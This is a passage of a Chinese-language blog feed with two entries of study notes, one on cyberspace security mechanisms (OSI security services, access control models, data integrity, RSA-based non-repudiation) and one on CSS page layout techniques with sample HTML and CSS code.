        <content type="html"><![CDATA[<blockquote><p>五重保障机制</p><p>OSI</p><p>三维图</p><p>常用技术</p></blockquote><blockquote><p>网络空间安全技术体系</p><p>网络空间安全技术机制</p></blockquote><h1 id="网络空间安全技术体系"><a href="#网络空间安全技术体系" class="headerlink" title="网络空间安全技术体系"></a>网络空间安全技术体系</h1><h2 id="网络空间安全保护机制"><a href="#网络空间安全保护机制" class="headerlink" title="网络空间安全保护机制"></a>网络空间安全保护机制</h2><ul><li>最终任务：保护信息资源被合法用户安全使用，禁止非法适用</li><li>五重保护机制：物理屏障、技术屏障、管理屏障、法律屏障、心理屏障</li><li>开放系统互联安全体系结构<ul><li>安全机制<ul><li>加密</li><li>数字签名</li><li>访问控制</li><li>数据完整性</li><li>鉴别交换</li><li>通信业务流填充————有规律的数据包中加入噪音</li><li>路由选择控制</li><li>公证————第三方机构</li></ul></li><li>安全服务（利用机制实现，，，&#x3D;&#x3D;理解服务对应的机制&#x3D;&#x3D;）<ul><li>鉴别服务————对等实体、数据源</li><li>访问控制服务</li><li>数据机密性服务</li><li>数据完整性服务</li><li>抗抵赖服务（行为、消息内容）</li></ul></li><li>OSI三维图</li></ul></li><li>体系框架<ul><li>总需求：物理安全…..</li><li>组织机构————机构、岗位、人事</li><li>管理体系————三分技术，七分管理；技术与管理并重（法律、制度、培训）</li></ul></li><li>技术和措施<ul><li>核心技术</li><li>计算机安全防护技术</li><li>计算机网络安全措施</li><li>物理安全</li><li>信息安全管理的重要举措</li></ul></li><li>技术层次分类<ul><li>物理层安全</li><li>系统层安全</li><li>网络层安全</li><li>应用层安全</li><li>管理层安全</li></ul></li></ul><h2 id="网络空间安全技术机制"><a href="#网络空间安全技术机制" class="headerlink" title="网络空间安全技术机制"></a>网络空间安全技术机制</h2><h3 id="加密机制"><a href="#加密机制" class="headerlink" title="加密机制"></a>加密机制</h3><ul><li>对称加密机制</li><li>分组密码</li><li>序列密码</li><li>公钥加密（RSA ECC）</li><li>消息鉴别码</li></ul><h3 id="数字签名机制"><a href="#数字签名机制" class="headerlink" title="数字签名机制"></a>数字签名机制</h3><h3 id="访问控制机制"><a href="#访问控制机制" class="headerlink" title="访问控制机制"></a>访问控制机制</h3><ul><li>合法的主体访问合法的客体</li><li>遵循最小特权原则</li><li>未授权访问：包括未经授权的使用、泄露、修改、销毁信息以 及颁发指令等。 <ul><li>▪非法用户对系统资源的使用 </li><li>▪合法用户对系统资源的非法使用</li></ul></li><li>作用：机密性、完整性和可用性</li></ul><h5 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h5><ul><li><p><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030082951860.png" alt="image-20231030082951860"></p><h5 id="访问控制分类"><a href="#访问控制分类" class="headerlink" title="访问控制分类"></a>访问控制分类</h5></li><li><p><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030083206413.png" alt="image-20231030083206413"></p></li><li><p>三要素：主体、客体、控制策略</p><h6 id="DAC"><a href="#DAC" class="headerlink" title="DAC"></a>DAC</h6><p><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030083313521.png" alt="image-20231030083313521">、</p><h6 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h6><p><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030083342107.png" alt="image-20231030083342107"></p><h6 id="RBAC"><a href="#RBAC" class="headerlink" title="RBAC"></a>RBAC</h6><p><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030083447051.png" alt="image-20231030083447051"></p><p>理解：角色：总经理的权限几乎是不太会变的，；一个开发团队来来回回进人出人的频率相对会高一些</p></li><li><p>访问控制的第二种分类：</p></li></ul><p><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030083720934.png" alt="image-20231030083720934"></p><h3 id="数据完整性机制"><a href="#数据完整性机制" class="headerlink" title="数据完整性机制"></a>数据完整性机制</h3><ul><li>定义：数据完整性是防止非法实体对交换数据的修改、插入、 替换和删除，或者如果被修改、插入、替换和删除时可以被检测 出来。数据完整性可以通过消息认证模式来保证。</li></ul><h5 id="完整性机制分类-实现手段维度"><a href="#完整性机制分类-实现手段维度" class="headerlink" title="完整性机制分类-实现手段维度"></a>完整性机制分类-实现手段维度</h5><ul><li>通过密码学提供完整性</li><li><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030084018525.png" alt="image-20231030084018525"></li><li>通过上下文提供完整性 </li><li>数据重复</li><li>预共识上下文<ul><li>信息传递方和接收方预先达成了共识，这个共识只有他们知道</li></ul></li><li>通过探测和确认提供完整性 </li><li>通过阻止提供完整性<ul><li>不让你访问：通过阻止对数据存储或传输媒体的物理访问</li><li>能让你访问 但是有访问控制机制</li></ul></li></ul><h5 id="完整性特性机制评价指标"><a href="#完整性特性机制评价指标" class="headerlink" title="完整性特性机制评价指标"></a>完整性特性机制评价指标</h5><ul><li>完整性验证的安全性</li></ul><p>​◆ 消息完整性安全要求对接收的数据的任何改动都能被发现，对于 给定的消息m1和其验证码H（m1），找到满足m2≠m1，且H（m2） ＝H（m1）的m2在计算上不可行 </p><ul><li>完整性验证中加密的安全</li></ul><p>​◆ 数据完整性验证的一些机制需要对其中的内容进行加密，例如摘要，加密算法的安全性（MD5）</p><ul><li>数据完整性验证的信息有效率</li></ul><p>​◆ 数据完整性验证的有效率是指原信息部分长度与合并后总信息（ 包括原消息和验证码）的长度之比。&#x3D;&#x3D;越高越好&#x3D;&#x3D;</p><ul><li>完整性验证算法的性能</li></ul><p>​◆ 数据完整性验证包括发送方计算验证码，进行加密，接收方重新 计算验证码，进行解密，比较等。</p><p>&#x3D;&#x3D;看评价&#x3D;&#x3D;</p><h5 id="基于数据校验思想的数据完整性验证机制"><a href="#基于数据校验思想的数据完整性验证机制" class="headerlink" title="基于数据校验思想的数据完整性验证机制"></a>基于数据校验思想的数据完整性验证机制</h5><p>CRC，只能查错，单错</p><h5 id="基于消息摘要的完整性验证机制"><a href="#基于消息摘要的完整性验证机制" class="headerlink" title="基于消息摘要的完整性验证机制"></a>基于消息摘要的完整性验证机制</h5><p>MD5 sha1 </p><h5 id="基于消息认证码（MAC）的数据完整性验证机制"><a href="#基于消息认证码（MAC）的数据完整性验证机制" class="headerlink" title="基于消息认证码（MAC）的数据完整性验证机制"></a>基于消息认证码（MAC）的数据完整性验证机制</h5><h5 id="基于错误检测码与对称密钥加密的完整性验证机"><a href="#基于错误检测码与对称密钥加密的完整性验证机" class="headerlink" title="基于错误检测码与对称密钥加密的完整性验证机"></a>基于错误检测码与对称密钥加密的完整性验证机</h5><h5 id="基于RSA的数字签名完整性验证机制"><a href="#基于RSA的数字签名完整性验证机制" class="headerlink" title="基于RSA的数字签名完整性验证机制"></a>基于RSA的数字签名完整性验证机制</h5><p>消息要有意义</p><h5 id="基于非对称密钥和对称密钥结合的完整性验证机制"><a href="#基于非对称密钥和对称密钥结合的完整性验证机制" class="headerlink" title="基于非对称密钥和对称密钥结合的完整性验证机制"></a>基于非对称密钥和对称密钥结合的完整性验证机制</h5><h5 id="密钥交换和密文交换是同时进行的"><a href="#密钥交换和密文交换是同时进行的" class="headerlink" title="密钥交换和密文交换是同时进行的"></a>密钥交换和密文交换是同时进行的</h5><h3 id="鉴别交换机制"><a href="#鉴别交换机制" class="headerlink" title="鉴别交换机制"></a>鉴别交换机制</h3><ul><li>分类<ul><li>向鉴别和双向鉴别 <ul><li>单向鉴别：通信双方中只有一方向另一方进行鉴别</li><li>双向鉴别：通信双方相互进行鉴别 </li><li>第三方鉴别：由可信第三方来确认身份</li></ul></li><li>本地鉴别和远程鉴别 <ul><li>本地鉴别：实体在本地环境的初始化鉴别 </li><li>远程鉴别：连接远程设备的实体鉴别</li></ul></li></ul></li></ul><p><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030092905188.png" alt="image-20231030092905188"></p><h3 id="通信业务流填充机制"><a href="#通信业务流填充机制" class="headerlink" title="通信业务流填充机制"></a>通信业务流填充机制</h3><h3 id="路由选择控制机制"><a href="#路由选择控制机制" class="headerlink" title="路由选择控制机制"></a>路由选择控制机制</h3><h3 id="抗抵赖机制"><a href="#抗抵赖机制" class="headerlink" title="抗抵赖机制"></a>抗抵赖机制</h3><p>抗抵赖机制旨在生成、收集、维护有关已声明 的事件或动作的证据，并使该证据可得并且确认该 证据，以此来解决关于此事件或动作发生或未发生 而引起的争议。</p><ul><li><p>数据完整性保证发送方和接收方的网络传送数据不被第 三方篡改和替换，但不能保证双方自身的欺骗和抵赖。</p></li><li><p>分类</p><ul><li>行为</li><li>内容</li></ul></li><li><p>基于RSA的数字签名抗抵赖机制 </p><ul><li>◆ 步骤1：A用自己的私钥签名消息M，用EA私(M）表示； </li><li>◆ 步骤2：A把签名的消息发送给B； </li><li>◆ 步骤3：B接收到签名的消息后用A的公钥验证，用公式 DA公(EA私(M）)表示； </li><li>◆ 步骤4：B如果验证成功，表示消息M一定是A发送的， 起到了数字签名的作用；</li></ul><p>&#x3D;&#x3D;能用A的公钥解密成功发，就表明了消息是A发送的&#x3D;&#x3D;</p><p>&#x3D;&#x3D;达到行为和内容的抗抵赖效果&#x3D;&#x3D;</p><p>&#x3D;&#x3D;不能双向抗抵赖，B不能证明它收到了&#x3D;&#x3D;</p></li></ul><p><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030094724529.png" alt="image-20231030094724529"></p><p>&#x3D;&#x3D;不能先加密后签名，除非你保证，密文与明文是一一对应&#x3D;&#x3D;</p><ul><li>解决RSA速度太慢</li></ul><p><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/image-20231030094906150.png" alt="image-20231030094906150"></p>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>布局</title>
      <link href="/2023/10/18/%E5%B8%83%E5%B1%80/"/>
      <url>/2023/10/18/%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="分栏"><a href="#分栏" class="headerlink" title="分栏"></a>分栏</h1><h2 id="堆叠"><a href="#堆叠" class="headerlink" title="堆叠"></a>堆叠</h2><h2 id="分栏-1"><a href="#分栏-1" class="headerlink" title="分栏"></a>分栏</h2><h3 id="1-分类："><a href="#1-分类：" class="headerlink" title="1. 分类："></a>1. 分类：</h3><p>固定 流式 响应式 </p><h3 id="2-布局相关的重要知识点"><a href="#2-布局相关的重要知识点" class="headerlink" title="2. 布局相关的重要知识点"></a>2. 布局相关的重要知识点</h3><ul><li><p>display</p><ul><li>不设置就默认inline</li><li>block中可以嵌入inline</li><li>inline中不可嵌入block</li><li>inline可并栏，左右margin生效</li><li>block不可栏，但左右上下margin生效</li><li>inline_block可以与其他元素并栏显示</li></ul><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/image-20231018193755638.png" alt="image-20231018193755638"></p></li><li><p>浮动</p></li><li><p>定位</p><ul><li>相对定位：相对自己移动，移动的位置不给其他元素</li><li>静态定位：不设置，从上到下，从左到右</li><li>固定定位：不可移动</li><li>绝对定位：以最近的relative父元素为参照物移动</li></ul></li><li><p>宽度计算</p><ul><li>盒子宽度设置了，content不变，margin、border、padding向外</li><li>盒子宽度未设置，content向内改变，整体宽度不点</li><li>宽度可叠加，高度叠加只取最高</li></ul></li></ul><h3 id="3-布局方式"><a href="#3-布局方式" class="headerlink" title="3. 布局方式"></a>3. 布局方式</h3><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/image-20231018202441913.png" alt="image-20231018202441913"></p><ul><li><p>table布局</p><ul><li>colspan、rowspan【横竖合并】</li><li>缺点：慢</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>布局：表格布局<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    *&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;   <span class="comment">/*屏蔽不同浏览器的差异*/</span></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.header</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: deeppink;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">line-height</span>: <span class="number">20px</span>;    <span class="comment">/*行高设置为元素高度，相当于垂直对齐*/</span></span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.footer</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: deeppink;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">line-height</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.nav</span>,<span class="selector-class">.section</span>,<span class="selector-class">.aside</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>:<span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>:<span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.nav</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: aqua;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.section</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: bisque;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.aside</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: darkgray;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;3&quot;</span>&gt;</span>header<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>link1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>link2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>link3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">        Lorem ipsum dolor sit, amet consectetur adipisicing elit. Omnis rem eum nemo. Tempora tenetur eaque impedit? Eveniet labore error autem incidunt voluptates earum necessitatibus, dignissimos obcaecati aperiam eaque corrupti excepturi!</span><br><span class="line">        Tempora sequi, tenetur officiis ad commodi, facilis expedita dolorum amet accusamus vero eos perferendis alias aliquam, sed quam minus aspernatur! Incidunt tenetur asperiores nulla accusamus quos cumque dolore cum perferendis.</span><br><span class="line">        Ad id laudantium dignissimos porro et velit earum. Ab exercitationem sapiente, ducimus minima distinctio nesciunt dignissimos qui, saepe ea dolorum nostrum blanditiis quisquam assumenda cum pariatur autem omnis obcaecati reiciendis.</span><br><span class="line">        Voluptates, quia! Totam maxime, temporibus aliquam possimus culpa sapiente hic eaque minus molestias modi illo optio, commodi architecto praesentium adipisci a impedit fugiat inventore ab fuga reprehenderit corporis, suscipit magni?</span><br><span class="line">        Magni itaque omnis dolore dolor, modi aut enim ut aspernatur consequatur aliquid optio temporibus, animi neque atque? Reiciendis commodi amet aspernatur repellendus, iusto obcaecati debitis, ipsum ex sint quae quibusdam!</span><br><span class="line">      <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;aside&quot;</span>&gt;</span></span><br><span class="line">        Lorem ipsum dolor sit amet consectetur adipisicing elit. Commodi at beatae saepe minima corporis perferendis expedita dolorum iusto adipisci tempora?</span><br><span class="line">      <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;3&quot;</span>&gt;</span>I am footer<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>div布局</p><p>解决并栏失效：</p><ul><li>box-sizing:border-box;宽度从border开始计算</li><li>但不能解决margin宽度</li><li>外盒子有宽度 ，内盒子不设置宽度</li></ul><p>解决页脚上移</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">  &lt;title&gt;粘性页脚：sticky <span class="selector-tag">footer</span>&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    <span class="comment">/* step 1 */</span></span><br><span class="line">    <span class="selector-tag">html</span>,<span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* step2  */</span></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">min-height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: auto <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>; <span class="comment">/*IE6不识别min-height*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.header</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: black;</span><br><span class="line">  <span class="attribute">color</span>:bisque;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">60px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.section</span> &#123;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* step3 */</span></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: black;</span><br><span class="line">  <span class="attribute">color</span>:bisque;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">60px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  &lt;/style&gt;</span><br></pre></td></tr></table></figure><p>解决并栏元素不等高：</p><ul><li><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/image-20231018204933578.png" alt="image-20231018204933578"></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.nav</span>&#123;</span><br><span class="line">     <span class="attribute">background-color</span>: deeppink;</span><br><span class="line">     <span class="attribute">display</span>: table-cell;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-class">.content</span>&#123;</span><br><span class="line">     <span class="attribute">background-color</span>: gold;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">     <span class="attribute">display</span>: table-cell;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-class">.aside</span>&#123;</span><br><span class="line">     <span class="attribute">background-color</span>: darkgoldenrod;</span><br><span class="line">     <span class="attribute">display</span>: table-cell;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>弹性布局</li></ul></li></ul></li><li><p>流式布局：只有一部分弹性</p><ul><li><p>负边距——</p><ul><li><p>margin_top:-xxx;   元素上移</p></li><li><p>margin_left:-xxx;   元素左移</p></li><li><p>margin_bottom，right;设定元素的后一个元素向指定（上左）方向移动</p></li><li><p>在实例子当中还是计算宽度</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>负边距实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.outer</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: bisque;</span></span><br><span class="line"><span class="language-css">      </span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"> </span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.inner1</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">180px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"> </span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.inner2</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: green;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin-left</span>:-<span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="comment">/* margin-left: -180px; */</span></span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner1&quot;</span>&gt;</span>上<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner2&quot;</span>&gt;</span>下<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>负边距可以实现垂直居中</p></li></ul></li></ul></li><li><p>响应式布局</p><ul><li><p>网页布局能够根据网页媒介改变样式(媒介查询语言)</p></li><li><pre><code class="html">&lt;style&gt;    @media screen&#123;        h1,p,pre&#123;          border:1px solid black;        &#125;         &#125;    @media print&#123;                //打印机      h1,p,pre&#123;          border:1px dotted deeppink;          color:yellow;        &#125;    &#125;  &lt;/style&gt;&lt;/head&gt;&lt;body&gt;  &lt;h1&gt;响应式布局&lt;/h1&gt;  &lt;p&gt;在css3 中提供了媒体查询语言，能够不同的媒介应用不同的样式规则,具体的语法：&lt;/p&gt;  &lt;pre&gt;      @media 条件｛        满足条件才会执行的样式规则      ｝  &lt;/pre&gt;  &lt;/body&gt;@media condition &#123;if condition==True应用样式规则&#125;<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### flex布局</span><br><span class="line"></span><br><span class="line">&gt; 参考：[Flex布局完全指南 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/25984121)</span><br><span class="line">&gt;</span><br><span class="line">&gt; </span><br><span class="line"></span><br><span class="line">- 理解：</span><br><span class="line"></span><br><span class="line">  - ![image-20231025194219800](%E5%B8%83%E5%B1%80/image-20231025194219800.png)</span><br><span class="line">  - 添加：display：flex，就是container</span><br><span class="line">  - 旗下所有子元素都是item</span><br><span class="line">  - inline  block inline-block失效</span><br><span class="line">  - float失效</span><br><span class="line">  - 只针对子元素有效</span><br><span class="line"></span><br><span class="line">- 布局思想</span><br><span class="line"></span><br><span class="line">  - ![image-20231025194535365](%E5%B8%83%E5%B1%80/image-20231025194535365.png)</span><br><span class="line">    - 在flex布局中，子元素要么按照主轴也就是main axis（从main-start到main-end）排布，要么按照交叉轴，也就是cross axis(从cross-start到cross-end)排布</span><br><span class="line">    - **main axis**: Flex 